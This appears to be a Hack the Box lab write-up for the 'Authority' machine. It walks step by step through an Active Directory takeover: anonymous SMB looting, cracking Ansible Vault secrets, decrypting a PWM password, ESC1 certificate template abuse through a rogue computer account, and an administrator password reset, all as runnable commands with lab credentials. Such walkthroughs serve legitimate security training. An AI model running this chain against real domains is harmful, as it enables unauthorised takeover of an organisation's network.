Authority - Hack the Box Write-up

Posted on March 3rd, 2026

We start by enumerating shares on the domain using an anonymous session with smbclient.

smbclient -L '\\authority.htb' -U ''

We find a share called "Development" and recursively download all of its contents.

smbclient '\\authority.htb\Development' -U ''

PROMPT OFF

RECURSE ON

mget *

We look through the directory and find credentials in a file called main.yml that were encrypted with Ansible Vault.

cat main.yml

We save one of the encrypted values into a file, use the ansible2john tool and obtain the hash of the Vault password. We then use hashcat to crack the hash and obtain the cleartext password.

Note: we must remove the filename from the hash file created by the ansible2john tool.

cat string

ansible2john string > hash

vim hash

hashcat hash /usr/share/wordlists/rockyou.txt.gz

We paste the pwm_admin_password value from the main.yml file into a text file, and decrypt it using the password.

ansible-vault decrypt pwm_admin_password

After some enumeration, we manage to use the previously obtained password to log in to the PWM configuration manager.

From the configuration manager interface, we click "Download Configuration"

We use this tool https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2 to decrypt the password in the config file. We hard-code the ENC-PW value found in the config file into the script.

cat PwmConfiguration.xml | grep ENC-PW

vim decrypt.py

pip3 install pycryptodome

python3 decrypt.py

We now have valid domain credentials. We test them using CrackMapExec.

crackmapexec smb authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --computers

We use the credentials to enumerate vulnerable certificate templates on the domain with certipy.

certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -target authority.htb -enabled -vulnerable -stdout

We find an ESC1 vulnerability on a certificate template called CorpVPN. We notice that domain computers are allowed to enroll. This is insecure as any domain user by default can create up to 10 domain computers that they control. We use Impacket's addcomputer.py tool to add a computer object to the domain.

impacket-addcomputer -computer-name 'test$' -computer-pass 'Password123' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'

Now that we have control over a computer object, we enroll using the vulnerable template. We specify the domain administrator's UPN while enrolling.

certipy-ad req -u 'test$@authority.htb' -p 'Password123' -dc-ip 10.129.229.56 -target 'authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'

We see that we have obtained a certificate as the domain administrator. If we try to authenticate with the certificate, we get an error:

This is because PKINIT is disabled on the domain. We instead authenticate to LDAP over TLS on port 636 using certipy's LDAP shell functionality.

certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip 10.129.229.56 -username 'administrator' -domain authority.htb

We change the domain administrator's password to Password123 and obtain an administrative session on the DC with WinRM.

change_password administrator Password123

evil-winrm -u administrator -p 'Password123' -i authority.htb
